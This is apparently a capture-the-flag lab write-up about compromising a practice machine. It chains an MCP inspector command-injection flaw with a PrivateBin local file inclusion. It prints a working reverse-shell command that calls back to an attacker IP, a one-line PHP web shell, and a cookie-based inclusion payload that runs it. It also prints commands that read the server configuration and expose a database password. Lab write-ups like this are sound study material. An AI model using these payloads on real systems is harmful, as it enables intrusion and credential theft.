## Ben
after exploiting the CVE-2026-23744 we gained access to the ben user and extracted the User flag.
```Shell
curl -X POST https://mcp.kobold.htb/api/mcp/connect -d '{"serverConfig":{"command":"bash", "args":["-c","bash -i >& /dev/tcp/10.10.14.201/1234 0>&1"], "env":{"DISPLAY":":0"}},"serverId":"rce_test"}' -k
```

```Shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cat /home/ben/user.txt 
9a520f8dc8a20db8805559210f866a83
```

checking we have found that there is a folder  `/privatebin-data` and whenever we create a new post on that web, a new folder was being added on `/privatebin-data/data/`.

We see inside of that `data` folder we have read-write permissions for one folder.

Approaching that the PrivateBin is vulnerable to LFI according to this vuln [CVE-2025-64714](https://github.com/advisories/GHSA-g2j9-g8r5-rg82), we will use it to read a php code and create an RCE.

For that, we will create the file with the following code inside of the folder `/privatebin-data/data/bd` 

```php
<?php system($_GET["cmd"]) ?>
```

with this we have our exploit ready to create a reverse shell.

Now we will use the CVE mentioned above to read this file and the webserver will execute it

```shell
curl -k -s "https://bin.kobold.htb/?cmd=ping+-c+1+10.10.14.201" -b "template=../data/bd/index" -w'%{http_code}' 
PING 10.10.14.201 (10.10.14.201): 56 data bytes
64 bytes from 10.10.14.201: seq=0 ttl=42 time=52.853 ms

--- 10.10.14.201 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 52.853/52.853/52.853 ms
200%  
```

as we can see we used it to send us an ICMP packet.

```shell
tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:14:48.863618 IP kobold.htb > HackArch: ICMP echo request, id 1, seq 0, length 64
21:14:48.863632 IP HackArch > kobold.htb: ICMP echo reply, id 1, seq 0, length 64
```

we tried to create a reverse shell and wasn' t possible so we gathered additional infromation and found the following on the cfg file.
```shell
➜ curl -k -s -b "template=../data/bd/index" "https://bin.kobold.htb/?cmd=cat+/srv/cfg/conf.php" | grep -E '^dsn' -A4 -B1
[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
tbl = "privatebin_"    ; table prefix
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"
opt[12] = true   ; PDO::ATTR_PERSISTENT
```

With this password we are able to log in on the App opened on the [[Port 3552]].